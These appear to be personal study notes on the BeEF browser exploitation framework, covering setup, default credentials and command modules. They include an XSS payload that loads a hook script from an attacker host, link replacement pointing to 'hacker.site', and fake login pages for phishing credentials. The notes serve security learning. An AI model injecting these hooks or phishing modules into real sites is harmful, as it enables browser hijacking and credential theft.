2024-12-20 20:07

Status:

Tags:

## **BeEF (Browser Exploitation Framework) Study Notes**

### **Introduction to BeEF**

- **BeEF** consists of:
    - A **web server** hosting a hooking JavaScript (`hook.js`).
    - A **web interface** for managing hooked browsers.
- **Pre-installed** on **Kali Linux**.

---

### **Hardening the Configuration**

Before using BeEF, secure its default settings:

1. **Navigate** to the BeEF configuration directory:
    
    bash
    
    Copy code
    
    `cd /etc/beef-xss`
    
2. **Edit Configuration File**:
    - Open `config.yaml` to modify settings.

#### Key Configurations:

- **Permitted UI Submit**:
    - Restrict UI access to the local machine to avoid unauthorized use.
- **Permitted Hooking Subnet**:
    - Scope control ensures browsers from **approved networks** only are hooked.
- **Listening Port**:
    - Use **port 80** or **443** to bypass corporate firewall policies.
    - Check for existing services listening on the chosen port.

---

### **Launching BeEF**

1. **Change Directory**:
    
    bash
    
    Copy code
    
    `cd /usr/share/beef-xss`
    
2. **Start BeEF**:
    
    bash
    
    Copy code
    
    `./beef`
    
3. **Access UI**:
    - Use the provided UI URL (e.g., `http://127.0.0.1:3000/ui/panel`).
    - Default Login:
        - **Username**: `beef`
        - **Password**: `beef`

---

### **Hooking Browsers**

To capture victim browsers:

1. Inject the **hooking script** (`hook.js`) into a vulnerable web page using **XSS**.
    
    html
    
    Copy code
    
    `<script src="http://<Your-IP>/hook.js"></script>`
    
2. **How It Works**:
    - When victims load the page, the hooking script runs and establishes communication with the BeEF server.
    - BeEF can send **commands** and gather information.

---

### **Managing Hooked Browsers**

- **All Hooked Browsers** are displayed in the UI under **"Online Browsers"**.
- Information collected:
    - **User Agent**
    - **OS and Browser Info**
    - **Installed Plugins**
    - **Window Size**
- If a browser disconnects, it moves to **"Offline Browsers"**.

---

### **Command Modules**

BeEF provides **modules** for executing commands against hooked browsers:

- **Module Icons**:
    - 🟢 **Green**: Invisible to the user.
    - 🟠 **Orange**: May be invisible.
    - ⚪ **Gray**: Untested for the target.
    - 🔴 **Red**: May not work.

#### Examples of Commands:

1. **Detect Pop-up Blocker**:
    - Checks if the victim browser has a pop-up blocker enabled.
2. **Replace HREFs**:
    - Replace all page hyperlinks with a malicious URL.
    - Example:
        
        http
        
        Copy code
        
        `http://hacker.site`
        
3. **Redirect Browser**:
    - Redirect the victim to a page under your control (e.g., a Rick Roll).
4. **Information Gathering**:
    - Detect **Virtual Machines** via screen resolution.
    - Retrieve the **Internal IP Address** using:
        - Java applet or
        - HTML5 WebRTC.

#### Social Engineering Modules:

- Inject fake content into the page:
    - **Fake Google Login Page**.
    - **Fake Flash Update**.
    - **Browser Notification Bars**.

> **Usage**: Can be leveraged in **phishing attacks** to collect credentials.

---

### **BeEF Browser Identification**

- Hooked browsers install a **cookie** for identification.
- Browsers can reconnect and persist across sessions.
- **Clear Data**:
    
    bash
    
    Copy code
    
    `./beef -x`
    

---

### **Practical Applications**

- **Penetration Testing**: Use hooked browsers as an entry point.
- **Phishing Attacks**:
    - Clone application login pages.
    - Collect credentials.
- **Information Gathering**:
    - Gather user data from browsing sessions.

---

### **Summary**

- BeEF automates **XSS exploitation** by hooking browsers and executing commands.
- Key features include:
    - **Information Gathering** (e.g., user details, IPs, plugins).
    - **Social Engineering** (fake logins, redirects).
    - **Session Control** via `hook.js`.
- Proper configuration hardening ensures secure and scoped usage.






### References
